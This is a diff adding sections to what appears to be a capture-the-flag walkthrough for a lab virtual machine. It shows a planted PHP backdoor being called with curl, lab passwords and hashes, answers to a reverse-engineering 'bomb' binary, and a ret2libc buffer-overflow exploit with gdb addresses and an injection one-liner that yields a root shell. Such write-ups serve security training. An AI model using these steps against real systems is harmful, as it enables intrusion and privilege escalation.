@@ -138,7 +138,7 @@ We can now launch our commands:
     curl --insecure https://192.168.56.102/forum/templates_c/backdoor.php?cmd=ls%20-al%20/home/LOOKATME 
 We see a LOOKATME file in the /home folder:
 We find it's the password for the ftp connection of user lmezard: G!@M6f4Eatau{sF"
-
+## Lmezard
 We connect to the ftp server, we see a fun file we download it, then we see which type of file it is: it's a POSIX tar archive let's unzip it:
 
     tar -xvf fun
@@ -167,7 +167,7 @@ We try a few commands to see what's inside we get something interesting with the
  we get                       
 
     330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
-
+ ## Laurie
 Now we can connect to ssh on the machine:
 
     ssh laurie@<IP>
@@ -186,3 +186,104 @@ We have a README file:
     NO SPACE IN THE PASSWORD (password is case sensitive).
 
 and a bomb binary
+We use ghidra to decompile this file:
+
+    ./bomb
+      1: "Public speaking is very easy."
+      2: 1 2 6 24 120 720
+      3: 1 b 214
+      4: 9
+      5: opukmq
+      6: 4 2 6 3 1 5
+
+First response is visible in ghidra
+Second one needs reverse engineering to work we use our script
+bomb2.c
+For the third one just read the info on ghidra
+For the fourth we have to use our over script to see which number is equal to 55
+For the fifth we need a tab of correspondance, we're using a python script
+And for 6, we use gdb and put a breakpoint on main and then you try to see the value of each node:
+
+    (gdb) print (int)node1
+    $4 = 253
+    (gdb) print (int)node2
+    $5 = 725
+    (gdb) print (int)node3
+    $6 = 301
+    (gdb) print (int)node4
+    $7 = 997
+    (gdb) print (int)node5
+    $8 = 212
+    (gdb) print (int)node6
+    $9 = 432
+
+Since we know from the readme that 4 is supposed to be first we do it in descending order of value of node:
+
+    4 2 6 3 1 5
+
+We put it all together and the password of thor is:
+
+![Source of error on last pahse of bomb](https://stackoverflowteams.com/c/42network/questions/664?newreg=03dfb4ee03a14b7b8047fd5be5bd11c3)
+
+    Publicspeakingisveryeasy.126241207201b2149opekmq426135
+
+## Thor
+
+We are now connected to thor:
+We see a turtle file with just direction in it, we search and find it's turtle module of python so let's try to draw this thing using our script
+
+It gives us SLASH
+we try it, doesn't work we hash it and find that with MD5 it's the right password
+
+    646da671ca01bb5d84dbb5fb2238dc8e
+
+## ZAZ
+
+We have an exploit_me binary created by root with a buffer overflow after the 140 character
+Let's use a ret-2-libc attack
+
+First we use gdb to see where exit and system are, and which libc is the binary using
+
+    (gdb) b main
+    Breakpoint 1 at 0x80483f7
+    (gdb) r
+    Starting program: /home/zaz/exploit_me 
+
+    Breakpoint 1, 0x080483f7 in main ()
+    (gdb) p system
+    $1 = {<text variable, no debug info>}   0xb7e6b060 <system>
+    (gdb) p exit
+    $2 = {<text variable, no debug info>}   0xb7e5ebe0 <exit>
+    (gdb) info proc map
+    process 2844
+    Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset objfile
+         0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
+         0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
+        0xb7e2b000 0xb7e2c000     0x1000        0x0 
+        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+
+
+Now we just have to find where /bin/sh is
+
+    strings -a -t x /lib/i386-linux-gnu/libc-2.15.so | grep "/bin/sh"
+        160c58 /bin/sh
+
+we add this hex with the beginning address of the libc using our script
+We get :
+
+    0xb7f8cc58
+
+Now we can inject :
+
+    ./exploit_me `python -c 'print("A"*140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")'`
+
+Now to check who we are:
+
+    # id
+    uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
+    # whoami
+    root
+
+Finished
